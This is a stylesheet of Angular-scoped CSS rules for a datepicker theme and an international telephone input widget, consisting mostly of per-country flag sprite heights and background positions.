		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span.selected[_ngcontent-tsy-c1],
		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[_ngcontent-tsy-c1] span[class*="select-"][_ngcontent-tsy-c1]:after,
		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.selected[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1],
		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td[class*="select-"][_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:after,
		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-head[_ngcontent-tsy-c1] {
			background-color: #f0ad4e;
		}

		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1] {
			color: #f0ad4e;
		}

		.theme-orange[_ngcontent-tsy-c1] .bs-datepicker-body[_ngcontent-tsy-c1] table[_ngcontent-tsy-c1] td.active-week[_ngcontent-tsy-c1] span[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
			background-color: #f0ad4e;
			color: #fff;
			opacity: 0.5;
			transition: none;
		}

		.iti-flag[_ngcontent-tsy-c1] {
			width: 20px;
		}

		.iti-flag.be[_ngcontent-tsy-c1] {
			width: 18px;
		}

		.iti-flag.ch[_ngcontent-tsy-c1] {
			width: 15px;
		}

		.iti-flag.mc[_ngcontent-tsy-c1] {
			width: 19px;
		}

		.iti-flag.ne[_ngcontent-tsy-c1] {
			width: 18px;
		}

		@media (-webkit-min-device-pixel-ratio: 2),
		(min-resolution: 192dpi) {
			.iti-flag[_ngcontent-tsy-c1] {
				background-size: 5652px 15px;
			}
		}

		.iti-flag.ac[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: 0 0;
		}

		.iti-flag.ad[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -22px 0;
		}

		.iti-flag.ae[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -44px 0;
		}

		.iti-flag.af[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -66px 0;
		}

		.iti-flag.ag[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -88px 0;
		}

		.iti-flag.ai[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -110px 0;
		}

		.iti-flag.al[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -132px 0;
		}

		.iti-flag.am[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -154px 0;
		}

		.iti-flag.ao[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -176px 0;
		}

		.iti-flag.aq[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -198px 0;
		}

		.iti-flag.ar[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -220px 0;
		}

		.iti-flag.as[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -242px 0;
		}

		.iti-flag.at[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -264px 0;
		}

		.iti-flag.au[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -286px 0;
		}

		.iti-flag.aw[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -308px 0;
		}

		.iti-flag.ax[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -330px 0;
		}

		.iti-flag.az[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -352px 0;
		}

		.iti-flag.ba[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -374px 0;
		}

		.iti-flag.bb[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -396px 0;
		}

		.iti-flag.bd[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -418px 0;
		}

		.iti-flag.be[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -440px 0;
		}

		.iti-flag.bf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -460px 0;
		}

		.iti-flag.bg[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -482px 0;
		}

		.iti-flag.bh[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -504px 0;
		}

		.iti-flag.bi[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -526px 0;
		}

		.iti-flag.bj[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -548px 0;
		}

		.iti-flag.bl[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -570px 0;
		}

		.iti-flag.bm[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -592px 0;
		}

		.iti-flag.bn[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -614px 0;
		}

		.iti-flag.bo[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -636px 0;
		}

		.iti-flag.bq[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -658px 0;
		}

		.iti-flag.br[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -680px 0;
		}

		.iti-flag.bs[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -702px 0;
		}

		.iti-flag.bt[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -724px 0;
		}

		.iti-flag.bv[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -746px 0;
		}

		.iti-flag.bw[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -768px 0;
		}

		.iti-flag.by[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -790px 0;
		}

		.iti-flag.bz[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -812px 0;
		}

		.iti-flag.ca[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -834px 0;
		}

		.iti-flag.cc[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -856px 0;
		}

		.iti-flag.cd[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -878px 0;
		}

		.iti-flag.cf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -900px 0;
		}

		.iti-flag.cg[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -922px 0;
		}

		.iti-flag.ch[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -944px 0;
		}

		.iti-flag.ci[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -961px 0;
		}

		.iti-flag.ck[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -983px 0;
		}

		.iti-flag.cl[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1005px 0;
		}

		.iti-flag.cm[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1027px 0;
		}

		.iti-flag.cn[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1049px 0;
		}

		.iti-flag.co[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1071px 0;
		}

		.iti-flag.cp[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1093px 0;
		}

		.iti-flag.cr[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -1115px 0;
		}

		.iti-flag.cu[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1137px 0;
		}

		.iti-flag.cv[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -1159px 0;
		}

		.iti-flag.cw[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1181px 0;
		}

		.iti-flag.cx[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1203px 0;
		}

		.iti-flag.cy[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1225px 0;
		}

		.iti-flag.cz[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1247px 0;
		}

		.iti-flag.de[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -1269px 0;
		}

		.iti-flag.dg[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1291px 0;
		}

		.iti-flag.dj[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1313px 0;
		}

		.iti-flag.dk[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -1335px 0;
		}

		.iti-flag.dm[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1357px 0;
		}

		.iti-flag.do[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1379px 0;
		}

		.iti-flag.dz[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1401px 0;
		}

		.iti-flag.ea[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1423px 0;
		}

		.iti-flag.ec[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1445px 0;
		}

		.iti-flag.ee[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -1467px 0;
		}

		.iti-flag.eg[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1489px 0;
		}

		.iti-flag.eh[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1511px 0;
		}

		.iti-flag.er[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1533px 0;
		}

		.iti-flag.es[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1555px 0;
		}

		.iti-flag.et[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1577px 0;
		}

		.iti-flag.eu[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1599px 0;
		}

		.iti-flag.fi[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -1621px 0;
		}

		.iti-flag.fj[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1643px 0;
		}

		.iti-flag.fk[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1665px 0;
		}

		.iti-flag.fm[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -1687px 0;
		}

		.iti-flag.fo[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -1709px 0;
		}

		.iti-flag.fr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1731px 0;
		}

		.iti-flag.ga[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -1753px 0;
		}

		.iti-flag.gb[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1775px 0;
		}

		.iti-flag.gd[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -1797px 0;
		}

		.iti-flag.ge[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1819px 0;
		}

		.iti-flag.gf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1841px 0;
		}

		.iti-flag.gg[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1863px 0;
		}

		.iti-flag.gh[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1885px 0;
		}

		.iti-flag.gi[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -1907px 0;
		}

		.iti-flag.gl[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1929px 0;
		}

		.iti-flag.gm[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1951px 0;
		}

		.iti-flag.gn[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1973px 0;
		}

		.iti-flag.gp[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -1995px 0;
		}

		.iti-flag.gq[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2017px 0;
		}

		.iti-flag.gr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2039px 0;
		}

		.iti-flag.gs[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2061px 0;
		}

		.iti-flag.gt[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -2083px 0;
		}

		.iti-flag.gu[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -2105px 0;
		}

		.iti-flag.gw[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2127px 0;
		}

		.iti-flag.gy[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2149px 0;
		}

		.iti-flag.hk[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2171px 0;
		}

		.iti-flag.hm[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2193px 0;
		}

		.iti-flag.hn[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2215px 0;
		}

		.iti-flag.hr[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2237px 0;
		}

		.iti-flag.ht[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2259px 0;
		}

		.iti-flag.hu[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2281px 0;
		}

		.iti-flag.ic[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2303px 0;
		}

		.iti-flag.id[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2325px 0;
		}

		.iti-flag.ie[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2347px 0;
		}

		.iti-flag.il[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -2369px 0;
		}

		.iti-flag.im[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2391px 0;
		}

		.iti-flag.in[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2413px 0;
		}

		.iti-flag.io[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2435px 0;
		}

		.iti-flag.iq[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2457px 0;
		}

		.iti-flag.ir[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2479px 0;
		}

		.iti-flag.is[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -2501px 0;
		}

		.iti-flag.it[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2523px 0;
		}

		.iti-flag.je[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2545px 0;
		}

		.iti-flag.jm[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2567px 0;
		}

		.iti-flag.jo[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2589px 0;
		}

		.iti-flag.jp[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2611px 0;
		}

		.iti-flag.ke[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2633px 0;
		}

		.iti-flag.kg[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2655px 0;
		}

		.iti-flag.kh[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -2677px 0;
		}

		.iti-flag.ki[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2699px 0;
		}

		.iti-flag.km[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2721px 0;
		}

		.iti-flag.kn[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2743px 0;
		}

		.iti-flag.kp[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2765px 0;
		}

		.iti-flag.kr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2787px 0;
		}

		.iti-flag.kw[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2809px 0;
		}

		.iti-flag.ky[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2831px 0;
		}

		.iti-flag.kz[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2853px 0;
		}

		.iti-flag.la[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2875px 0;
		}

		.iti-flag.lb[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -2897px 0;
		}

		.iti-flag.lc[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2919px 0;
		}

		.iti-flag.li[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -2941px 0;
		}

		.iti-flag.lk[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -2963px 0;
		}

		.iti-flag.lr[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -2985px 0;
		}

		.iti-flag.ls[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3007px 0;
		}

		.iti-flag.lt[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -3029px 0;
		}

		.iti-flag.lu[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -3051px 0;
		}

		.iti-flag.lv[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3073px 0;
		}

		.iti-flag.ly[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3095px 0;
		}

		.iti-flag.ma[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3117px 0;
		}

		.iti-flag.mc[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -3139px 0;
		}

		.iti-flag.md[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3160px 0;
		}

		.iti-flag.me[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3182px 0;
		}

		.iti-flag.mf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3204px 0;
		}

		.iti-flag.mg[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3226px 0;
		}

		.iti-flag.mh[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -3248px 0;
		}

		.iti-flag.mk[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3270px 0;
		}

		.iti-flag.ml[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3292px 0;
		}

		.iti-flag.mm[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3314px 0;
		}

		.iti-flag.mn[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3336px 0;
		}

		.iti-flag.mo[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3358px 0;
		}

		.iti-flag.mp[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3380px 0;
		}

		.iti-flag.mq[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3402px 0;
		}

		.iti-flag.mr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3424px 0;
		}

		.iti-flag.ms[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3446px 0;
		}

		.iti-flag.mt[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3468px 0;
		}

		.iti-flag.mu[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3490px 0;
		}

		.iti-flag.mv[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3512px 0;
		}

		.iti-flag.mw[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3534px 0;
		}

		.iti-flag.mx[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -3556px 0;
		}

		.iti-flag.my[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3578px 0;
		}

		.iti-flag.mz[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3600px 0;
		}

		.iti-flag.na[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3622px 0;
		}

		.iti-flag.nc[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3644px 0;
		}

		.iti-flag.ne[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -3666px 0;
		}

		.iti-flag.nf[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3686px 0;
		}

		.iti-flag.ng[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3708px 0;
		}

		.iti-flag.ni[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -3730px 0;
		}

		.iti-flag.nl[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3752px 0;
		}

		.iti-flag.no[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -3774px 0;
		}

		.iti-flag.np[_ngcontent-tsy-c1] {
			width: 13px;
			height: 15px;
			background-position: -3796px 0;
		}

		.iti-flag.nr[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3811px 0;
		}

		.iti-flag.nu[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3833px 0;
		}

		.iti-flag.nz[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3855px 0;
		}

		.iti-flag.om[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3877px 0;
		}

		.iti-flag.pa[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3899px 0;
		}

		.iti-flag.pe[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3921px 0;
		}

		.iti-flag.pf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -3943px 0;
		}

		.iti-flag.pg[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -3965px 0;
		}

		.iti-flag.ph[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -3987px 0;
		}

		.iti-flag.pk[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4009px 0;
		}

		.iti-flag.pl[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -4031px 0;
		}

		.iti-flag.pm[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4053px 0;
		}

		.iti-flag.pn[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4075px 0;
		}

		.iti-flag.pr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4097px 0;
		}

		.iti-flag.ps[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4119px 0;
		}

		.iti-flag.pt[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4141px 0;
		}

		.iti-flag.pw[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -4163px 0;
		}

		.iti-flag.py[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -4185px 0;
		}

		.iti-flag.qa[_ngcontent-tsy-c1] {
			height: 8px;
			background-position: -4207px 0;
		}

		.iti-flag.re[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4229px 0;
		}

		.iti-flag.ro[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4251px 0;
		}

		.iti-flag.rs[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4273px 0;
		}

		.iti-flag.ru[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4295px 0;
		}

		.iti-flag.rw[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4317px 0;
		}

		.iti-flag.sa[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4339px 0;
		}

		.iti-flag.sb[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4361px 0;
		}

		.iti-flag.sc[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4383px 0;
		}

		.iti-flag.sd[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4405px 0;
		}

		.iti-flag.se[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -4427px 0;
		}

		.iti-flag.sg[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4449px 0;
		}

		.iti-flag.sh[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4471px 0;
		}

		.iti-flag.si[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4493px 0;
		}

		.iti-flag.sj[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -4515px 0;
		}

		.iti-flag.sk[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4537px 0;
		}

		.iti-flag.sl[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4559px 0;
		}

		.iti-flag.sm[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -4581px 0;
		}

		.iti-flag.sn[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4603px 0;
		}

		.iti-flag.so[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4625px 0;
		}

		.iti-flag.sr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4647px 0;
		}

		.iti-flag.ss[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4669px 0;
		}

		.iti-flag.st[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4691px 0;
		}

		.iti-flag.sv[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -4713px 0;
		}

		.iti-flag.sx[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4735px 0;
		}

		.iti-flag.sy[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4757px 0;
		}

		.iti-flag.sz[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4779px 0;
		}

		.iti-flag.ta[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4801px 0;
		}

		.iti-flag.tc[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4823px 0;
		}

		.iti-flag.td[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4845px 0;
		}

		.iti-flag.tf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4867px 0;
		}

		.iti-flag.tg[_ngcontent-tsy-c1] {
			height: 13px;
			background-position: -4889px 0;
		}

		.iti-flag.th[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4911px 0;
		}

		.iti-flag.tj[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4933px 0;
		}

		.iti-flag.tk[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4955px 0;
		}

		.iti-flag.tl[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -4977px 0;
		}

		.iti-flag.tm[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -4999px 0;
		}

		.iti-flag.tn[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5021px 0;
		}

		.iti-flag.to[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -5043px 0;
		}

		.iti-flag.tr[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5065px 0;
		}

		.iti-flag.tt[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -5087px 0;
		}

		.iti-flag.tv[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -5109px 0;
		}

		.iti-flag.tw[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5131px 0;
		}

		.iti-flag.tz[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5153px 0;
		}

		.iti-flag.ua[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5175px 0;
		}

		.iti-flag.ug[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5197px 0;
		}

		.iti-flag.um[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -5219px 0;
		}

		.iti-flag.un[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5241px 0;
		}

		.iti-flag.us[_ngcontent-tsy-c1] {
			height: 11px;
			background-position: -5263px 0;
		}

		.iti-flag.uy[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5285px 0;
		}

		.iti-flag.uz[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -5307px 0;
		}

		.iti-flag.va[_ngcontent-tsy-c1] {
			width: 15px;
			height: 15px;
			background-position: -5329px 0;
		}

		.iti-flag.vc[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5346px 0;
		}

		.iti-flag.ve[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5368px 0;
		}

		.iti-flag.vg[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -5390px 0;
		}

		.iti-flag.vi[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5412px 0;
		}

		.iti-flag.vn[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5434px 0;
		}

		.iti-flag.vu[_ngcontent-tsy-c1] {
			height: 12px;
			background-position: -5456px 0;
		}

		.iti-flag.wf[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5478px 0;
		}

		.iti-flag.ws[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -5500px 0;
		}

		.iti-flag.xk[_ngcontent-tsy-c1] {
			height: 15px;
			background-position: -5522px 0;
		}

		.iti-flag.ye[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5544px 0;
		}

		.iti-flag.yt[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5566px 0;
		}

		.iti-flag.za[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5588px 0;
		}

		.iti-flag.zm[_ngcontent-tsy-c1] {
			height: 14px;
			background-position: -5610px 0;
		}

		.iti-flag.zw[_ngcontent-tsy-c1] {
			height: 10px;
			background-position: -5632px 0;
		}

		.intl-tel-input[_ngcontent-tsy-c1] {
			position: relative;
			display: inline-block;
		}

		.intl-tel-input[_ngcontent-tsy-c1] *[_ngcontent-tsy-c1] {
			box-sizing: border-box;
			-moz-box-sizing: border-box;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .hide[_ngcontent-tsy-c1] {
			display: none;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .v-hide[_ngcontent-tsy-c1] {
			visibility: hidden;
		}

		.intl-tel-input[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1],
		.intl-tel-input[_ngcontent-tsy-c1] input[type="tel"][_ngcontent-tsy-c1],
		.intl-tel-input[_ngcontent-tsy-c1] input[type="text"][_ngcontent-tsy-c1] {
			position: relative;
			z-index: 0;
			margin-top: 0 !important;
			margin-bottom: 0 !important;
			padding-right: 36px;
			margin-right: 0;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1] {
			position: absolute;
			top: 0;
			bottom: 0;
			right: 0;
			padding: 1px;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1] {
			z-index: 1;
			position: relative;
			display: flex;
			align-items: center;
			height: 100%;
			padding: 0 6px 0 8px;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1] .iti-arrow[_ngcontent-tsy-c1] {
			margin-left: 6px;
			width: 0;
			height: 0;
			border-left: 3px solid transparent;
			border-right: 3px solid transparent;
			border-top: 4px solid #555;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1] .iti-arrow.up[_ngcontent-tsy-c1] {
			border-top: none;
			border-bottom: 4px solid #555;
		}

